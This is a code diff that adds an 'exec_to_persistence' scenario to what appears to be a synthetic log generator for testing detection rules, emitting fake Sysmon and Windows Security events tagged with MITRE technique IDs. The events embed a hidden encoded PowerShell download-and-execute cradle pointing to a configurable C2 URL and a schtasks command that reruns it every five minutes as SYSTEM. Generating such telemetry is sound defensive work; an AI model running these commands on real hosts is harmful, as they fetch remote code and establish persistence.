@@ -160,9 +160,62 @@ def dns_beacon(cfg: dict, world: World, tl: Timeline, start: float) -> None:
              note=f"{beacons} regular-interval DNS TXT queries to *.{c2}")
 
 
+def exec_to_persistence(cfg: dict, world: World, tl: Timeline, start: float) -> None:
+    """Tight execution -> persistence chain on one host (feeds rule 100420)."""
+    p = cfg["params"]
+    name = cfg["name"]
+    host = p["host"]
+    user = p["user"]
+    gap = float(p.get("gap_seconds", 8))
+    domain, _, sam = user.partition("\\")
+    if not sam:
+        domain, sam = "CORP", user
+
+    # Step 1: encoded PowerShell (execution) spawned by an Office process.
+    cradle = f"IEX (New-Object Net.WebClient).DownloadString('{p['c2_url']}')"
+    ps_cmd = f"powershell.exe -NoP -NonI -W Hidden -Enc {_psencode(cradle)}"
+    ps_guid = world.guid()
+    tl.emit(start, "windows_events.json", partial(
+        windows.sysmon_process_create,
+        computer=host, record_id=world.record_id(), image=windows.POWERSHELL,
+        command_line=ps_cmd, parent_image=p["parent_image"],
+        parent_command_line=f'"{p["parent_image"]}" /n', user=user,
+        process_guid=ps_guid, parent_process_guid=world.guid(),
+        process_id=world.pid(), parent_process_id=world.pid()))
+    tl.label(start, technique_id="T1059.001", tactic="Execution", scenario=name,
+             host=host, source="sysmon", expected_rules=p.get("expected_rules_exec", []),
+             note="encoded PowerShell (kill-chain step 1: execution)")
+
+    # Step 2: that PowerShell registers a scheduled task (persistence).
+    off = start + gap
+    payload = f"powershell.exe -NoP -W Hidden -Enc {_psencode(cradle)}"
+    schtasks_cmd = (f'schtasks.exe /Create /F /SC MINUTE /MO 5 /TN "{p["task_name"]}" '
+                    f'/TR "{payload}" /RU SYSTEM')
+    tl.emit(off, "windows_events.json", partial(
+        windows.sysmon_process_create,
+        computer=host, record_id=world.record_id(), image=windows.SCHTASKS,
+        command_line=schtasks_cmd, parent_image=windows.POWERSHELL,
+        parent_command_line=ps_cmd, user=user,
+        process_guid=world.guid(), parent_process_guid=ps_guid,
+        process_id=world.pid(), parent_process_id=world.pid()))
+    task_xml = (
+        "<Task><Triggers><TimeTrigger><Repetition><Interval>PT5M</Interval>"
+        "</Repetition></TimeTrigger></Triggers><Actions><Exec>"
+        "<Command>powershell.exe</Command><Arguments>-NoP -W Hidden -Enc ...</Arguments>"
+        "</Exec></Actions></Task>")
+    tl.emit(off + 0.4, "windows_events.json", partial(
+        windows.security_scheduled_task_created,
+        computer=host, record_id=world.record_id(), subject_user=sam,
+        subject_domain=domain, task_name=p["task_name"], task_content=task_xml))
+    tl.label(off, technique_id="T1053.005", tactic="Persistence", scenario=name,
+             host=host, source="sysmon+security", expected_rules=p.get("expected_rules_persist", []),
+             note="scheduled-task persistence right after execution (kill-chain step 2)")
+
+
 BUILDERS = {
     "brute_force_success": brute_force_success,
     "powershell_cradle": powershell_cradle,
     "scheduled_task": scheduled_task,
     "dns_beacon": dns_beacon,
+    "exec_to_persistence": exec_to_persistence,
 }
